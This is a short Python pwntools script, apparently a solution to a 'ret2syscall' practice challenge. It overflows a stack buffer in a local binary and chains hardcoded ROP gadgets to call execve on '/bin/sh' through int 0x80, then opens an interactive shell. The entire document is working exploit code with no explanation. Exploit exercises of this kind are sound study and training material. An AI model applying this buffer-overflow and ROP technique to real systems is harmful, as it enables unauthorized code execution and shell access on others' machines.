#!/usr/bin/env python
from pwn import *

EBP = 0xffffccc8
BUF = EBP - 0x6c

SH = 0x080be408
INT = 0x08049421
POP_EAX = 0x080bb196
POP_EDX_ECX_EBX = 0x0806eb90

if __name__ == "__main__":
    context.arch = 'i386'
    # context.log_level = 'debug'
    context.endian = 'little'
    p = process("./ret2syscall.out")
    file = ELF("./ret2syscall.out")
    payload = b"A" * (EBP - BUF + 4) + p32(POP_EAX) + p32(0xb) + p32(POP_EDX_ECX_EBX) + p32(0) + p32(0) + p32(SH) + p32(INT)
    p.sendline(payload)
    p.interactive()